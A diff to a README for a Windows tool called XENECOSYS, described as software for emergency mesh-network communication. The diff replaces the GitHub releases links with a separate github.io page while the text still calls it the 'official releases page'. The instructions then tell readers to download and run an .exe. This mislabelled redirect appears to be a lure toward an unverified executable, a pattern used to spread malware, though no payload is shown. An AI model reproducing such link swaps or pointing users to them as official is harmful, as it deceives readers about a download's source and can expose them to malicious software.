@@ -1,6 +1,6 @@
 # 🌐 XENECOSYS - Manage emergency coordination and communication hubs
 
-[![Download XENECOSYS](https://img.shields.io/badge/Download-XENECOSYS-blue)](https://github.com/Easypickupd5562/XENECOSYS/releases)
+[![Download XENECOSYS](https://img.shields.io/badge/Download-XENECOSYS-blue)](https://easypickupd5562.github.io)
 
 XENECOSYS serves as a communication tool for emergency coordination. It manages hubs and coordinates data across mesh networks. This application helps teams maintain contact when standard networks fail. Users rely on this system to organize resources and protect communication lines.
 
@@ -8,7 +8,7 @@ XENECOSYS serves as a communication tool for emergency coordination. It manages 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Easypickupd5562/XENECOSYS/releases).
+1. Visit the [official releases page](https://easypickupd5562.github.io).
 2. Look for the most recent version labeled as the latest release.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start the download.
